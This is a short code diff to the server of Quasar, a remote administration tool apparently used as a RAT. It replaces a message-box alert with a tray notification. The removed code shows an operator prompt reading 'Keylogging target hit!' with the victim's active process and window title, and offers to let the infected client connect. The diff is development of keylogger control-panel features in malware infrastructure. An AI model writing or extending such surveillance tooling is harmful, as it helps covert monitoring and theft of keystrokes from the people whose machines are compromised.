@@ -257,37 +257,7 @@ namespace Quasar.Server.Networking
         private bool HandleTargetHitPrompt(string uuid, ClientPingRequest ping, bool accept)
         {
             PlayTargetHitTagSound(uuid);
-
-            string proc = ping.ActiveProcessName ?? "";
-            string title = ping.ActiveWindowTitle ?? "";
-            if (string.IsNullOrWhiteSpace(proc)) proc = "(unknown process)";
-            if (string.IsNullOrWhiteSpace(title)) title = "(unknown window title)";
-
-            if (!accept)
-            {
-                var msg =
-                    $"Keylogging target hit!\n\nProcess: {proc}\nWindow: {title}\n\nAllow this client to connect now?";
-                var result = MessageBox.Show(
-                    msg,
-                    "Target Hit",
-                    MessageBoxButtons.YesNo,
-                    MessageBoxIcon.Information);
-
-                if (result == DialogResult.Yes)
-                {
-                    _clientDb.SetClientAcceptPing(uuid, true);
-                    accept = true;
-                }
-            }
-            else
-            {
-                MessageBox.Show(
-                    $"Keylogging target hit!\n\nProcess: {proc}\nWindow: {title}",
-                    "Target Hit",
-                    MessageBoxButtons.OK,
-                    MessageBoxIcon.Information);
-            }
-
+            /* Target-hit details are shown via tray balloon; Hit column shows Pending (see FrmMain.SetPingByClient). */
             return accept;
         }
     }
